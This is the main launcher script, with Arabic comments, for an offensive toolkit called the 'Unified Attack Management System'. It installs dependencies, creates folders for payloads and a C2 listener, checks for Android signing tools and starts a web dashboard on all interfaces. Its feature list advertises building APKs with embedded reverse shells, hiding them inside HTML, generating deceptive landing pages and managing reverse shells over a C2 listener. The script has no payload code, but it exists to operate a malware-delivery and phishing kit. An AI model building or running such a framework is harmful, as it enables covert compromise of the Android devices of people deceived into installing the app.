#!/usr/bin/env python3
"""
UAMS Framework - ملف التشغيل الرئيسي
تشغيل النظام المتكامل من نقطة واحدة
"""

import os
import sys
import subprocess
import webbrowser
from datetime import datetime

def check_dependencies():
    """التحقق من التبعيات المطلوبة"""
    print("[+] التحقق من التبعيات...")
    
    required_packages = [
        'flask',
        'flask_cors',
        'cryptography',
        'requests'
    ]
    
    missing = []
    for package in required_packages:
        try:
            __import__(package.replace('-', '_'))
        except ImportError:
            missing.append(package)
    
    if missing:
        print(f"[-] المكتبات الناقصة: {', '.join(missing)}")
        print("[+] جاري التثبيت...")
        
        for package in missing:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
    
    print("[✓] جميع التبعيات مثبتة")

def setup_directories():
    """إعداد مجلدات النظام"""
    print("[+] إعداد مجلدات النظام...")
    
    directories = [
        'payloads',
        'generated_pages',
        'c2_listener/logs',
        'builder_engine/templates',
        'crypter_engine/templates',
        'backend/templates',
        'backend/static'
    ]
    
    for directory in directories:
        os.makedirs(directory, exist_ok=True)
        print(f"  [✓] {directory}")
    
    print("[✓] تم إعداد المجلدات")

def check_android_tools():
    """التحقق من أدوات Android"""
    print("[+] التحقق من أدوات Android...")
    
    required_tools = ['java', 'keytool', 'jarsigner']
    missing_tools = []
    
    for tool in required_tools:
        try:
            subprocess.run([tool, '-version'], capture_output=True, check=True)
            print(f"  [✓] {tool}")
        except:
            missing_tools.append(tool)
            print(f"  [-] {tool} غير مثبت")
    
    if missing_tools:
        print("\n[!] تحذير: بعض أدوات Android غير مثبتة")
        print("[!] بعض الميزات قد لا تعمل بشكل كامل")
        print("[!] تأكد من تثبيت Java JDK و Android SDK")

def start_backend():
    """تشغيل لوحة التحكم الخلفية"""
    print("[+] تشغيل لوحة التحكم...")
    
    # استيراد وتشغيل Flask
    from backend.app import app, uams
    
    # بدء النظام
    uams.start()
    
    # فتح المتصفح تلقائياً
    webbrowser.open('http://127.0.0.1:8080')
    
    # تشغيل خادم Flask
    app.run(host='0.0.0.0', port=8080, debug=False)

def show_banner():
    """عرض شعار النظام"""
    banner = """
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║   ██╗   ██╗ █████╗ ███╗   ███╗███████╗                      ║
    ║   ██║   ██║██╔══██╗████╗ ████║██╔════╝                      ║
    ║   ██║   ██║███████║██╔████╔██║███████╗                      ║
    ║   ╚██╗ ██╔╝██╔══██║██║╚██╔╝██║╚════██║                      ║
    ║    ╚████╔╝ ██║  ██║██║ ╚═╝ ██║███████║                      ║
    ║     ╚═══╝  ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝                      ║
    ║                                                              ║
    ║       Unified Attack Management System (UAMS)                ║
    ║            إطار عمل متكامل لإدارة الهجمات                     ║
    ║                     Version 1.0                              ║
    ║                                                              ║
    ╚══════════════════════════════════════════════════════════════╝
    
    [*] System Initialization...
    """
    print(banner)

def main():
    """الدالة الرئيسية"""
    try:
        # عرض الشعار
        show_banner()
        
        # التحقق من التبعيات
        check_dependencies()
        
        # إعداد المجلدات
        setup_directories()
        
        # التحقق من أدوات Android
        check_android_tools()
        
        print("\n" + "="*60)
        print("          UAMS FRAMEWORK READY")
        print("="*60)
        
        print("\n[*] الميزات المتوفرة:")
        print("  1. ✅ APK Builder - بناء تطبيقات مع Reverse Shell")
        print("  2. ✅ Crypter Engine - تشفير وتضمين APK في HTML")
        print("  3. ✅ Landing Page Generator - صفحات ويب مخادعة")
        print("  4. ✅ C2 Listener - إدارة Reverse Shells")
        print("  5. ✅ Web Dashboard - لوحة تحكم ويب متكاملة")
        
        print("\n[*] روابط النظام:")
        print("  • Dashboard: http://127.0.0.1:8080")
        print("  • C2 Listener: 127.0.0.1:4444")
        print("  • Web Server: http://127.0.0.1:8000")
        
        print("\n[*] اضغط Enter لبدء التشغيل...")
        input()
        
        # تشغيل النظام
        start_backend()
        
    except KeyboardInterrupt:
        print("\n\n[!] تم إيقاف النظام بواسطة المستخدم")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] خطأ غير متوقع: {e}")
        sys.exit(1)

if __name__ == "__main__":
    # تغيير المسار للدليل الحالي
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    
    # تشغيل النظام
    main()